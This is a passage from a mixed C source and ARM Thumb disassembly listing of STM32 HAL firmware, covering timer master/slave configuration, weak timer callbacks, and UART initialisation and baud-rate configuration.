 80055e8:	d004      	beq.n	80055f4 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80055ea:	687b      	ldr	r3, [r7, #4]
 80055ec:	681b      	ldr	r3, [r3, #0]
 80055ee:	4a10      	ldr	r2, [pc, #64]	; (8005630 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 80055f0:	4293      	cmp	r3, r2
 80055f2:	d10c      	bne.n	800560e <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 80055f4:	68bb      	ldr	r3, [r7, #8]
 80055f6:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 80055fa:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 80055fc:	683b      	ldr	r3, [r7, #0]
 80055fe:	689b      	ldr	r3, [r3, #8]
 8005600:	68ba      	ldr	r2, [r7, #8]
 8005602:	4313      	orrs	r3, r2
 8005604:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 8005606:	687b      	ldr	r3, [r7, #4]
 8005608:	681b      	ldr	r3, [r3, #0]
 800560a:	68ba      	ldr	r2, [r7, #8]
 800560c:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 800560e:	687b      	ldr	r3, [r7, #4]
 8005610:	2201      	movs	r2, #1
 8005612:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005616:	687b      	ldr	r3, [r7, #4]
 8005618:	2200      	movs	r2, #0
 800561a:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 800561e:	2300      	movs	r3, #0
}
 8005620:	4618      	mov	r0, r3
 8005622:	3714      	adds	r7, #20
 8005624:	46bd      	mov	sp, r7
 8005626:	f85d 7b04 	ldr.w	r7, [sp], #4
 800562a:	4770      	bx	lr
 800562c:	40012c00 	.word	0x40012c00
 8005630:	40014000 	.word	0x40014000

08005634 <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 8005634:	b480      	push	{r7}
 8005636:	b083      	sub	sp, #12
 8005638:	af00      	add	r7, sp, #0
 800563a:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 800563c:	bf00      	nop
 800563e:	370c      	adds	r7, #12
 8005640:	46bd      	mov	sp, r7
 8005642:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005646:	4770      	bx	lr

08005648 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 8005648:	b480      	push	{r7}
 800564a:	b083      	sub	sp, #12
 800564c:	af00      	add	r7, sp, #0
 800564e:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 8005650:	bf00      	nop
 8005652:	370c      	adds	r7, #12
 8005654:	46bd      	mov	sp, r7
 8005656:	f85d 7b04 	ldr.w	r7, [sp], #4
 800565a:	4770      	bx	lr

0800565c <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 800565c:	b480      	push	{r7}
 800565e:	b083      	sub	sp, #12
 8005660:	af00      	add	r7, sp, #0
 8005662:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 8005664:	bf00      	nop
 8005666:	370c      	adds	r7, #12
 8005668:	46bd      	mov	sp, r7
 800566a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800566e:	4770      	bx	lr

08005670 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 8005670:	b580      	push	{r7, lr}
 8005672:	b082      	sub	sp, #8
 8005674:	af00      	add	r7, sp, #0
 8005676:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 8005678:	687b      	ldr	r3, [r7, #4]
 800567a:	2b00      	cmp	r3, #0
 800567c:	d101      	bne.n	8005682 <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 800567e:	2301      	movs	r3, #1
 8005680:	e040      	b.n	8005704 <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 8005682:	687b      	ldr	r3, [r7, #4]
 8005684:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 8005686:	2b00      	cmp	r3, #0
 8005688:	d106      	bne.n	8005698 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 800568a:	687b      	ldr	r3, [r7, #4]
 800568c:	2200      	movs	r2, #0
 800568e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 8005692:	6878      	ldr	r0, [r7, #4]
 8005694:	f7fb fd78 	bl	8001188 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 8005698:	687b      	ldr	r3, [r7, #4]
 800569a:	2224      	movs	r2, #36	; 0x24
 800569c:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 800569e:	687b      	ldr	r3, [r7, #4]
 80056a0:	681b      	ldr	r3, [r3, #0]
 80056a2:	681a      	ldr	r2, [r3, #0]
 80056a4:	687b      	ldr	r3, [r7, #4]
 80056a6:	681b      	ldr	r3, [r3, #0]
 80056a8:	f022 0201 	bic.w	r2, r2, #1
 80056ac:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 80056ae:	687b      	ldr	r3, [r7, #4]
 80056b0:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80056b2:	2b00      	cmp	r3, #0
 80056b4:	d002      	beq.n	80056bc <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 80056b6:	6878      	ldr	r0, [r7, #4]
 80056b8:	f000 fa54 	bl	8005b64 <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 80056bc:	6878      	ldr	r0, [r7, #4]
 80056be:	f000 f825 	bl	800570c <UART_SetConfig>
 80056c2:	4603      	mov	r3, r0
 80056c4:	2b01      	cmp	r3, #1
 80056c6:	d101      	bne.n	80056cc <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 80056c8:	2301      	movs	r3, #1
 80056ca:	e01b      	b.n	8005704 <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 80056cc:	687b      	ldr	r3, [r7, #4]
 80056ce:	681b      	ldr	r3, [r3, #0]
 80056d0:	685a      	ldr	r2, [r3, #4]
 80056d2:	687b      	ldr	r3, [r7, #4]
 80056d4:	681b      	ldr	r3, [r3, #0]
 80056d6:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 80056da:	605a      	str	r2, [r3, #4]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 80056dc:	687b      	ldr	r3, [r7, #4]
 80056de:	681b      	ldr	r3, [r3, #0]
 80056e0:	689a      	ldr	r2, [r3, #8]
 80056e2:	687b      	ldr	r3, [r7, #4]
 80056e4:	681b      	ldr	r3, [r3, #0]
 80056e6:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 80056ea:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 80056ec:	687b      	ldr	r3, [r7, #4]
 80056ee:	681b      	ldr	r3, [r3, #0]
 80056f0:	681a      	ldr	r2, [r3, #0]
 80056f2:	687b      	ldr	r3, [r7, #4]
 80056f4:	681b      	ldr	r3, [r3, #0]
 80056f6:	f042 0201 	orr.w	r2, r2, #1
 80056fa:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 80056fc:	6878      	ldr	r0, [r7, #4]
 80056fe:	f000 fad3 	bl	8005ca8 <UART_CheckIdleState>
 8005702:	4603      	mov	r3, r0
}
 8005704:	4618      	mov	r0, r3
 8005706:	3708      	adds	r7, #8
 8005708:	46bd      	mov	sp, r7
 800570a:	bd80      	pop	{r7, pc}

0800570c <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 800570c:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 8005710:	b08a      	sub	sp, #40	; 0x28
 8005712:	af00      	add	r7, sp, #0
 8005714:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 8005716:	2300      	movs	r3, #0
 8005718:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 800571c:	68fb      	ldr	r3, [r7, #12]
 800571e:	689a      	ldr	r2, [r3, #8]
 8005720:	68fb      	ldr	r3, [r7, #12]
 8005722:	691b      	ldr	r3, [r3, #16]
 8005724:	431a      	orrs	r2, r3
 8005726:	68fb      	ldr	r3, [r7, #12]
 8005728:	695b      	ldr	r3, [r3, #20]
 800572a:	431a      	orrs	r2, r3
 800572c:	68fb      	ldr	r3, [r7, #12]
 800572e:	69db      	ldr	r3, [r3, #28]
 8005730:	4313      	orrs	r3, r2
 8005732:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 8005734:	68fb      	ldr	r3, [r7, #12]
 8005736:	681b      	ldr	r3, [r3, #0]
 8005738:	681a      	ldr	r2, [r3, #0]
 800573a:	4bb4      	ldr	r3, [pc, #720]	; (8005a0c <UART_SetConfig+0x300>)
 800573c:	4013      	ands	r3, r2
 800573e:	68fa      	ldr	r2, [r7, #12]
 8005740:	6812      	ldr	r2, [r2, #0]
 8005742:	6a79      	ldr	r1, [r7, #36]	; 0x24
 8005744:	430b      	orrs	r3, r1
 8005746:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 8005748:	68fb      	ldr	r3, [r7, #12]
 800574a:	681b      	ldr	r3, [r3, #0]
 800574c:	685b      	ldr	r3, [r3, #4]
 800574e:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 8005752:	68fb      	ldr	r3, [r7, #12]
 8005754:	68da      	ldr	r2, [r3, #12]
 8005756:	68fb      	ldr	r3, [r7, #12]
 8005758:	681b      	ldr	r3, [r3, #0]
 800575a:	430a      	orrs	r2, r1
 800575c:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 800575e:	68fb      	ldr	r3, [r7, #12]
 8005760:	699b      	ldr	r3, [r3, #24]
 8005762:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 8005764:	68fb      	ldr	r3, [r7, #12]
 8005766:	681b      	ldr	r3, [r3, #0]
 8005768:	4aa9      	ldr	r2, [pc, #676]	; (8005a10 <UART_SetConfig+0x304>)
 800576a:	4293      	cmp	r3, r2
 800576c:	d004      	beq.n	8005778 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 800576e:	68fb      	ldr	r3, [r7, #12]
 8005770:	6a1b      	ldr	r3, [r3, #32]
 8005772:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005774:	4313      	orrs	r3, r2
 8005776:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 8005778:	68fb      	ldr	r3, [r7, #12]
 800577a:	681b      	ldr	r3, [r3, #0]
 800577c:	689b      	ldr	r3, [r3, #8]
 800577e:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 8005782:	68fb      	ldr	r3, [r7, #12]
 8005784:	681b      	ldr	r3, [r3, #0]
 8005786:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005788:	430a      	orrs	r2, r1
 800578a:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 800578c:	68fb      	ldr	r3, [r7, #12]
 800578e:	681b      	ldr	r3, [r3, #0]
 8005790:	4aa0      	ldr	r2, [pc, #640]	; (8005a14 <UART_SetConfig+0x308>)
 8005792:	4293      	cmp	r3, r2
 8005794:	d126      	bne.n	80057e4 <UART_SetConfig+0xd8>
 8005796:	4ba0      	ldr	r3, [pc, #640]	; (8005a18 <UART_SetConfig+0x30c>)
 8005798:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800579c:	f003 0303 	and.w	r3, r3, #3
 80057a0:	2b03      	cmp	r3, #3
 80057a2:	d81b      	bhi.n	80057dc <UART_SetConfig+0xd0>
 80057a4:	a201      	add	r2, pc, #4	; (adr r2, 80057ac <UART_SetConfig+0xa0>)
 80057a6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80057aa:	bf00      	nop
 80057ac:	080057bd 	.word	0x080057bd
 80057b0:	080057cd 	.word	0x080057cd
 80057b4:	080057c5 	.word	0x080057c5
 80057b8:	080057d5 	.word	0x080057d5
 80057bc:	2301      	movs	r3, #1
 80057be:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057c2:	e080      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80057c4:	2302      	movs	r3, #2
 80057c6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057ca:	e07c      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80057cc:	2304      	movs	r3, #4
 80057ce:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057d2:	e078      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80057d4:	2308      	movs	r3, #8
 80057d6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057da:	e074      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80057dc:	2310      	movs	r3, #16
 80057de:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80057e2:	e070      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80057e4:	68fb      	ldr	r3, [r7, #12]
 80057e6:	681b      	ldr	r3, [r3, #0]
 80057e8:	4a8c      	ldr	r2, [pc, #560]	; (8005a1c <UART_SetConfig+0x310>)
 80057ea:	4293      	cmp	r3, r2
 80057ec:	d138      	bne.n	8005860 <UART_SetConfig+0x154>
 80057ee:	4b8a      	ldr	r3, [pc, #552]	; (8005a18 <UART_SetConfig+0x30c>)
 80057f0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80057f4:	f003 030c 	and.w	r3, r3, #12
 80057f8:	2b0c      	cmp	r3, #12
 80057fa:	d82d      	bhi.n	8005858 <UART_SetConfig+0x14c>
 80057fc:	a201      	add	r2, pc, #4	; (adr r2, 8005804 <UART_SetConfig+0xf8>)
 80057fe:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005802:	bf00      	nop
 8005804:	08005839 	.word	0x08005839
 8005808:	08005859 	.word	0x08005859
 800580c:	08005859 	.word	0x08005859
 8005810:	08005859 	.word	0x08005859
 8005814:	08005849 	.word	0x08005849
 8005818:	08005859 	.word	0x08005859
 800581c:	08005859 	.word	0x08005859
 8005820:	08005859 	.word	0x08005859
 8005824:	08005841 	.word	0x08005841
 8005828:	08005859 	.word	0x08005859
 800582c:	08005859 	.word	0x08005859
 8005830:	08005859 	.word	0x08005859
 8005834:	08005851 	.word	0x08005851
 8005838:	2300      	movs	r3, #0
 800583a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800583e:	e042      	b.n	80058c6 <UART_SetConfig+0x1ba>
 8005840:	2302      	movs	r3, #2
 8005842:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005846:	e03e      	b.n	80058c6 <UART_SetConfig+0x1ba>
 8005848:	2304      	movs	r3, #4
 800584a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800584e:	e03a      	b.n	80058c6 <UART_SetConfig+0x1ba>
 8005850:	2308      	movs	r3, #8
 8005852:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005856:	e036      	b.n	80058c6 <UART_SetConfig+0x1ba>
 8005858:	2310      	movs	r3, #16
 800585a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800585e:	e032      	b.n	80058c6 <UART_SetConfig+0x1ba>
 8005860:	68fb      	ldr	r3, [r7, #12]
 8005862:	681b      	ldr	r3, [r3, #0]
 8005864:	4a6a      	ldr	r2, [pc, #424]	; (8005a10 <UART_SetConfig+0x304>)
 8005866:	4293      	cmp	r3, r2
 8005868:	d12a      	bne.n	80058c0 <UART_SetConfig+0x1b4>
 800586a:	4b6b      	ldr	r3, [pc, #428]	; (8005a18 <UART_SetConfig+0x30c>)
 800586c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005870:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 8005874:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005878:	d01a      	beq.n	80058b0 <UART_SetConfig+0x1a4>
 800587a:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 800587e:	d81b      	bhi.n	80058b8 <UART_SetConfig+0x1ac>
 8005880:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005884:	d00c      	beq.n	80058a0 <UART_SetConfig+0x194>
 8005886:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 800588a:	d815      	bhi.n	80058b8 <UART_SetConfig+0x1ac>
 800588c:	2b00      	cmp	r3, #0
 800588e:	d003      	beq.n	8005898 <UART_SetConfig+0x18c>
 8005890:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8005894:	d008      	beq.n	80058a8 <UART_SetConfig+0x19c>
 8005896:	e00f      	b.n	80058b8 <UART_SetConfig+0x1ac>
 8005898:	2300      	movs	r3, #0
 800589a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800589e:	e012      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80058a0:	2302      	movs	r3, #2
 80058a2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058a6:	e00e      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80058a8:	2304      	movs	r3, #4
 80058aa:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058ae:	e00a      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80058b0:	2308      	movs	r3, #8
 80058b2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058b6:	e006      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80058b8:	2310      	movs	r3, #16
 80058ba:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80058be:	e002      	b.n	80058c6 <UART_SetConfig+0x1ba>
 80058c0:	2310      	movs	r3, #16
 80058c2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 80058c6:	68fb      	ldr	r3, [r7, #12]
 80058c8:	681b      	ldr	r3, [r3, #0]
 80058ca:	4a51      	ldr	r2, [pc, #324]	; (8005a10 <UART_SetConfig+0x304>)
 80058cc:	4293      	cmp	r3, r2
 80058ce:	d17a      	bne.n	80059c6 <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 80058d0:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80058d4:	2b08      	cmp	r3, #8
 80058d6:	d824      	bhi.n	8005922 <UART_SetConfig+0x216>
 80058d8:	a201      	add	r2, pc, #4	; (adr r2, 80058e0 <UART_SetConfig+0x1d4>)
 80058da:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80058de:	bf00      	nop
 80058e0:	08005905 	.word	0x08005905
 80058e4:	08005923 	.word	0x08005923
 80058e8:	0800590d 	.word	0x0800590d
 80058ec:	08005923 	.word	0x08005923
 80058f0:	08005913 	.word	0x08005913
 80058f4:	08005923 	.word	0x08005923
 80058f8:	08005923 	.word	0x08005923
 80058fc:	08005923 	.word	0x08005923
 8005900:	0800591b 	.word	0x0800591b
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005904:	f7fe fe6c 	bl	80045e0 <HAL_RCC_GetPCLK1Freq>
 8005908:	61f8      	str	r0, [r7, #28]
        break;
 800590a:	e010      	b.n	800592e <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 800590c:	4b44      	ldr	r3, [pc, #272]	; (8005a20 <UART_SetConfig+0x314>)
 800590e:	61fb      	str	r3, [r7, #28]
        break;
 8005910:	e00d      	b.n	800592e <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005912:	f7fe fdcd 	bl	80044b0 <HAL_RCC_GetSysClockFreq>
 8005916:	61f8      	str	r0, [r7, #28]
        break;
 8005918:	e009      	b.n	800592e <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800591a:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800591e:	61fb      	str	r3, [r7, #28]
        break;
 8005920:	e005      	b.n	800592e <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 8005922:	2300      	movs	r3, #0
 8005924:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005926:	2301      	movs	r3, #1
 8005928:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 800592c:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 800592e:	69fb      	ldr	r3, [r7, #28]
 8005930:	2b00      	cmp	r3, #0
 8005932:	f000 8107 	beq.w	8005b44 <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005936:	68fb      	ldr	r3, [r7, #12]
 8005938:	685a      	ldr	r2, [r3, #4]
 800593a:	4613      	mov	r3, r2
 800593c:	005b      	lsls	r3, r3, #1
 800593e:	4413      	add	r3, r2
 8005940:	69fa      	ldr	r2, [r7, #28]
 8005942:	429a      	cmp	r2, r3
 8005944:	d305      	bcc.n	8005952 <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 8005946:	68fb      	ldr	r3, [r7, #12]
 8005948:	685b      	ldr	r3, [r3, #4]
 800594a:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 800594c:	69fa      	ldr	r2, [r7, #28]
 800594e:	429a      	cmp	r2, r3
 8005950:	d903      	bls.n	800595a <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 8005952:	2301      	movs	r3, #1
 8005954:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005958:	e0f4      	b.n	8005b44 <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 800595a:	69fb      	ldr	r3, [r7, #28]
 800595c:	2200      	movs	r2, #0
 800595e:	461c      	mov	r4, r3
 8005960:	4615      	mov	r5, r2
 8005962:	f04f 0200 	mov.w	r2, #0
 8005966:	f04f 0300 	mov.w	r3, #0
 800596a:	022b      	lsls	r3, r5, #8
 800596c:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 8005970:	0222      	lsls	r2, r4, #8
 8005972:	68f9      	ldr	r1, [r7, #12]
 8005974:	6849      	ldr	r1, [r1, #4]
 8005976:	0849      	lsrs	r1, r1, #1
 8005978:	2000      	movs	r0, #0
 800597a:	4688      	mov	r8, r1
 800597c:	4681      	mov	r9, r0
 800597e:	eb12 0a08 	adds.w	sl, r2, r8
 8005982:	eb43 0b09 	adc.w	fp, r3, r9
 8005986:	68fb      	ldr	r3, [r7, #12]
 8005988:	685b      	ldr	r3, [r3, #4]
 800598a:	2200      	movs	r2, #0
 800598c:	603b      	str	r3, [r7, #0]
 800598e:	607a      	str	r2, [r7, #4]
 8005990:	e9d7 2300 	ldrd	r2, r3, [r7]
 8005994:	4650      	mov	r0, sl
 8005996:	4659      	mov	r1, fp
 8005998:	f7fa fc20 	bl	80001dc <__aeabi_uldivmod>
 800599c:	4602      	mov	r2, r0
 800599e:	460b      	mov	r3, r1
 80059a0:	4613      	mov	r3, r2
 80059a2:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 80059a4:	69bb      	ldr	r3, [r7, #24]
 80059a6:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 80059aa:	d308      	bcc.n	80059be <UART_SetConfig+0x2b2>
 80059ac:	69bb      	ldr	r3, [r7, #24]
 80059ae:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 80059b2:	d204      	bcs.n	80059be <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 80059b4:	68fb      	ldr	r3, [r7, #12]
 80059b6:	681b      	ldr	r3, [r3, #0]
 80059b8:	69ba      	ldr	r2, [r7, #24]
 80059ba:	60da      	str	r2, [r3, #12]
 80059bc:	e0c2      	b.n	8005b44 <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 80059be:	2301      	movs	r3, #1
 80059c0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80059c4:	e0be      	b.n	8005b44 <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 80059c6:	68fb      	ldr	r3, [r7, #12]
 80059c8:	69db      	ldr	r3, [r3, #28]
 80059ca:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 80059ce:	d16a      	bne.n	8005aa6 <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 80059d0:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80059d4:	2b08      	cmp	r3, #8
 80059d6:	d834      	bhi.n	8005a42 <UART_SetConfig+0x336>
 80059d8:	a201      	add	r2, pc, #4	; (adr r2, 80059e0 <UART_SetConfig+0x2d4>)
 80059da:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80059de:	bf00      	nop
 80059e0:	08005a05 	.word	0x08005a05
 80059e4:	08005a25 	.word	0x08005a25
 80059e8:	08005a2d 	.word	0x08005a2d
 80059ec:	08005a43 	.word	0x08005a43
 80059f0:	08005a33 	.word	0x08005a33
 80059f4:	08005a43 	.word	0x08005a43
 80059f8:	08005a43 	.word	0x08005a43
 80059fc:	08005a43 	.word	0x08005a43
 8005a00:	08005a3b 	.word	0x08005a3b
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
